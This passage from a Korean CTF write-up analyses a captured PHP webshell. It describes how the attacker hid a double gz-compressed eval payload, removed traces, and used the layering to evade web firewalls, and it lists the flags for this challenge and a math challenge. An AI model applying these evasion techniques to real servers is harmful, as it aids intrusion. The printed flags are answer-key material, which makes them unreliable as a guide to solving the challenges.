![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20108.png)

6-10. 이후 공격자는 공격행위에 대한 흔적을 지우기 위해 "photo.png" 파일과 ".htaccess" 파일을 제거하고

이후 접근시 서버측에서는 아까와 다르게 "HTTP/1.1 404 Not Found"를 반환한다.

즉 웹쉘이 완벽하게 삭제된걸 볼 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20109.png)

6-11. Wireshark로 해당 웹쉘을 추출하면 위와 같은 모습으로 되어 있다.

PHP 코드로 작성되어 있으며, 문자열이 gz압축되어 있으며, 이걸 압축 해제하여 eval함수로 실행한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20110.png)

6-12. 해당 악성코드(웹쉘)을 분석하기 위해 eval function으로 실행하지 말고 echo로 문자열을 해제한 값을 출력한다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20111.png)

6-13. PHP Cli이 설치되어 있다면, 위와 같은 명령으로 바로 실행이 가능하다.

실행한 결과를 보면 "6-12"로 압축된 문자열이 해제되어 보여진다.

<코드 설명해주기 → 2중 문자열 압축>

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20112.png)

6-14. "6-13"코드를 vscode로 쓰-윽 더 한눈에 보기 쉽게 볼 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20113.png)

6-15. 이중 문자열 압축된걸 또 같은 방법으로 해제 한다면 위 그림와 같이 볼 수 있다.

\<코드 설명\>

실제 바이너리로된 악성코드를 넣는다면 분석 시간과 노력이 많이 필요함으로, 악성코드와 비슷하게

집 파일만 넣어서 떨궈주고 집파일이 실행하여 웹페이지를 변조하는 원리로 넣었다고 생각하면된다.

또한 위 방법은 실제로 악성코드로 내부망 감염을 위해 먼저 웹방화벽을 우회하기 위한 목적으로 위와 같은 원리로 진행함.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20114.png)

해당 웹쉘을 분석하여 숨어져있는 웹쉘을 추출하여 암호화된 집 파일을 해제하면 2개의 파일을 볼 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20115.png)

6-16. 변조 당한 웹 페이지다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20116.png)

6-17. 요건 플래그다.

FLAG: hspace{F@ke_zBxAs_H@ck_VMBinwBYb_Sell}


## [MISC] EZ_Babymath

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__18.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__19.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__20.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__21.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__22.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__23.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__24.png)

FLAG: hspace{do_the_math_if_you_can!!}